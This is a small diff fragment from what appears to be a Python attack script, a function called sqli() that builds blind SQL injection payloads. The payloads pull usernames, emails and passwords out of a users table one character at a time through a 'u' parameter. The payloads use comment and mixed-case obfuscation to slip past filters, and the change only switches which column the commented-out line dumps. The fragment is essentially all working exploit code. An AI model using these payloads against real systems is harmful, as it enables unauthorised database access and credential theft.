@@ -19,7 +19,7 @@ def sqli():
             break
         for char in charlist:                     
             # Dump data
-            #params=f"u=admin'/**_**/AnD/**_**/(seLeCt/**_**/subStrINg(username,{num},1)fRoM/**_**/users/**_**/lIMit/**_**/1/**_**/ofFSet/**_**/0)='{char}'--test"
+            #params=f"u=admin'/**_**/AnD/**_**/(seLeCt/**_**/subStrINg(email,{num},1)fRoM/**_**/users/**_**/lIMit/**_**/1/**_**/ofFSet/**_**/0)='{char}'--test"
             
             params= f"u=admin'/**_**/AnD/**_**/ASCii(subStrINg((SelECT/**_**/passwOrd/**_**/fRoM/**_**/users/**_**/limIT/**_**/1/**_**/offSET/**_**/0),{num},1))={char}--test"
                        
